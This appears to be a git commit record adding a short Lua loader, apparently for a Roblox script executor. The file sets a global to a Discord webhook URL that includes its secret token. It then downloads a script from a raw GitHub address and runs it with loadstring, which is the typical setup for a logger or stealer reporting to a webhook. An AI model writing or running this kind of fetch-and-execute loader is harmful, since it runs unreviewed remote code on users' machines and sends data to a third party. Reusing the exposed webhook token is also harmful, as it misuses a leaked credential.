da03b3a889dfc9df4809424496bcf8e4933183b5
trnger <tmsfnrgr@gmail.com>
2026-01-02 18:44:46 +0000

    Create whoktest.lua

---
+++ shortest.lua
@@ -0,0 +1,3 @@
+_G.webhook = "https://discord.com/api/webhooks/1456705912860442647/_CyA2j0-btKgJ7BdfFMN_r7HX2fEpVHy7IRo1KseHCCA8Pp3B1DlElfRdXoowZSwytrK"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/trnger/test/refs/heads/main/whok.lua"))()
